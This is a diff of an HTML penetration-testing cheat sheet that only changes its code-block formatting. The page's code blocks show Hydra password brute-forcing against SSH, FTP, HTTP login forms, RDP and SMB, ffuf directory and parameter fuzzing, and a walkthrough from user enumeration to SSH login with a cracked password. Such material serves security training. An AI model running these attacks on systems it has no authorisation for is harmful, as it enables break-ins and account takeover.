@@ -87,17 +87,6 @@
         a:hover {
             text-decoration: underline;
         }
-        /* Force all syntax highlighting spans to black */
-        .codehilite pre span,
-        .codehilite pre span.c, .codehilite pre span.c1, .codehilite pre span.ch,
-        .codehilite pre span.k, .codehilite pre span.kd, .codehilite pre span.kr,
-        .codehilite pre span.m, .codehilite pre span.mi,
-        .codehilite pre span.n, .codehilite pre span.nb, .codehilite pre span.nc, .codehilite pre span.nf, .codehilite pre span.nv,
-        .codehilite pre span.o,
-        .codehilite pre span.p, .codehilite pre span.py,
-        .codehilite pre span.s, .codehilite pre span.s1, .codehilite pre span.s2, .codehilite pre span.se,
-        .codehilite pre span.w { color: #000000 !important; }
-        pre span { color: #000000 !important; }
         @media print {
             body { margin: 0; padding: 10px; }
             pre { page-break-inside: avoid; }
@@ -129,9 +118,9 @@
 <h2 id="installation-setup">Installation &amp; Setup</h2>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># CachyOS:</span>
-sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>hydra
-hydra<span class="w"> </span>-h<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20<span class="w">  </span><span class="c1"># Verify</span>
+<pre><code># CachyOS:
+sudo pacman -S hydra
+hydra -h | head -20  # Verify
 </code></pre>
 </div>
 
@@ -142,44 +131,44 @@ hydra<span class="w"> </span>-h<span class="w"> </span><span class="p">|</span><
 <h3 id="1-ssh-brute-force">1. <strong>SSH Brute Force</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>ssh://192.168.1.100
-hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>ssh://192.168.1.100<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span>
+<pre><code>hydra -l admin -p password ssh://192.168.1.100
+hydra -L users.txt -P passwords.txt ssh://192.168.1.100 -t 4
 </code></pre>
 </div>
 
 <h3 id="2-ftp-brute-force">2. <strong>FTP Brute Force</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>ftp://192.168.1.100
-hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>ftp://192.168.1.100<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span>
+<pre><code>hydra -l admin -p password ftp://192.168.1.100
+hydra -L users.txt -P pass.txt ftp://192.168.1.100 -t 4
 </code></pre>
 </div>
 
 <h3 id="3-http-login-form">3. <strong>HTTP Login Form</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>http-post-form://target.com/login.php:user<span class="o">=</span>^USER^<span class="p">&amp;</span><span class="nv">pass</span><span class="o">=</span>^PASS^:F<span class="o">=</span>Login
+<pre><code>hydra -l admin -P passwords.txt http-post-form://target.com/login.php:user=^USER^&amp;pass=^PASS^:F=Login
 </code></pre>
 </div>
 
 <h3 id="4-rdp-brute-force">4. <strong>RDP Brute Force</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>administrator<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>rdp://192.168.1.100
+<pre><code>hydra -l administrator -P passwords.txt rdp://192.168.1.100
 </code></pre>
 </div>
 
 <h3 id="5-smb-brute-force">5. <strong>SMB Brute Force</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>administrator<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>smb://192.168.1.100
+<pre><code>hydra -l administrator -P passwords.txt smb://192.168.1.100
 </code></pre>
 </div>
 
 <h3 id="6-multiple-services-at-once">6. <strong>Multiple Services at Once</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>ssh<span class="w"> </span>ftp<span class="w"> </span>http-get
+<pre><code>hydra -l admin -P pass.txt 192.168.1.100 ssh ftp http-get
 </code></pre>
 </div>
 
@@ -239,23 +228,23 @@ hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w">
 <h2 id="real-world-example">Real-World Example</h2>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Scenario: Found service running, need credentials</span>
+<pre><code># Scenario: Found service running, need credentials
 
-<span class="c1"># Step 1: Create user list from reconnaissance</span>
-enum4linux<span class="w"> </span>-U<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>&gt;<span class="w"> </span>users.txt
+# Step 1: Create user list from reconnaissance
+enum4linux -U 192.168.1.100 &gt; users.txt
 
-<span class="c1"># Step 2: Extract just usernames</span>
-grep<span class="w"> </span><span class="s2">&quot;Account:&quot;</span><span class="w"> </span>users.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $NF}&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>usernames.txt
+# Step 2: Extract just usernames
+grep &quot;Account:&quot; users.txt | awk &#39;{print $NF}&#39; &gt; usernames.txt
 
-<span class="c1"># Step 3: Brute force SSH</span>
-hydra<span class="w"> </span>-L<span class="w"> </span>usernames.txt<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>ssh://192.168.1.100<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span>
+# Step 3: Brute force SSH
+hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 4
 
-<span class="c1"># Step 4: Found credentials!</span>
-<span class="c1"># user1:password123</span>
+# Step 4: Found credentials!
+# user1:password123
 
-<span class="c1"># Step 5: Login</span>
-ssh<span class="w"> </span>user1@192.168.1.100
-<span class="c1"># Enter password: password123</span>
+# Step 5: Login
+ssh user1@192.168.1.100
+# Enter password: password123
 </code></pre>
 </div>
 
@@ -312,9 +301,9 @@ ssh<span class="w"> </span>user1@192.168.1.100
 <h2 id="installation-setup-2">Installation &amp; Setup</h2>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># CachyOS:</span>
-sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>ffuf
-ffuf<span class="w"> </span>-h<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+<pre><code># CachyOS:
+sudo pacman -S ffuf
+ffuf -h | head -20
 </code></pre>
 </div>
 
@@ -325,43 +314,43 @@ ffuf<span class="w"> </span>-h<span class="w"> </span><span class="p">|</span><s
 <h3 id="1-directory-brute-force">1. <strong>Directory Brute Force</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>ffuf<span class="w"> </span>-u<span class="w"> </span>http://target/FUZZ<span class="w"> </span>-w<span class="w"> </span>wordlist.txt
+<pre><code>ffuf -u http://target/FUZZ -w wordlist.txt
 </code></pre>
 </div>
 
 <h3 id="2-with-extensions">2. <strong>with Extensions</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>ffuf<span class="w"> </span>-u<span class="w"> </span>http://target/FUZZ.php<span class="w"> </span>-w<span class="w"> </span>wordlist.txt
+<pre><code>ffuf -u http://target/FUZZ.php -w wordlist.txt
 </code></pre>
 </div>
 
 <h3 id="3-subdomain-fuzzing">3. <strong>Subdomain Fuzzing</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>ffuf<span class="w"> </span>-u<span class="w"> </span>http://FUZZ.target.com<span class="w"> </span>-w<span class="w"> </span>subdomains.txt<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ.target.com&quot;</span>
+<pre><code>ffuf -u http://FUZZ.target.com -w subdomains.txt -H &quot;Host: FUZZ.target.com&quot;
 </code></pre>
 </div>
 
 <h3 id="4-post-parameter-fuzzing">4. <strong>POST Parameter Fuzzing</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>ffuf<span class="w"> </span>-u<span class="w"> </span>http://target/search<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;q=FUZZ&quot;</span><span class="w"> </span>-w<span class="w"> </span>wordlist.txt
+<pre><code>ffuf -u http://target/search -d &quot;q=FUZZ&quot; -w wordlist.txt
 </code></pre>
 </div>
 
 <h3 id="5-cookie-fuzzing">5. <strong>Cookie Fuzzing</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>ffuf<span class="w"> </span>-u<span class="w"> </span>http://target/page<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: id=FUZZ&quot;</span><span class="w"> </span>-w<span class="w"> </span>numbers.txt
+<pre><code>ffuf -u http://target/page -H &quot;Cookie: id=FUZZ&quot; -w numbers.txt
 </code></pre>
 </div>
 
 <h3 id="6-custom-filtering">6. <strong>Custom Filtering</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code>ffuf<span class="w"> </span>-u<span class="w"> </span>http://target/FUZZ<span class="w"> </span>-w<span class="w"> </span>wordlist.txt<span class="w"> </span>-mc<span class="w"> </span><span class="m">200</span>,301
-ffuf<span class="w"> </span>-u<span class="w"> </span>http://target/FUZZ<span class="w"> </span>-w<span class="w"> </span>wordlist.txt<span class="w"> </span>-fc<span class="w"> </span><span class="m">404</span>
+<pre><code>ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301
+ffuf -u http://target/FUZZ -w wordlist.txt -fc 404
 </code></pre>
 </div>
 
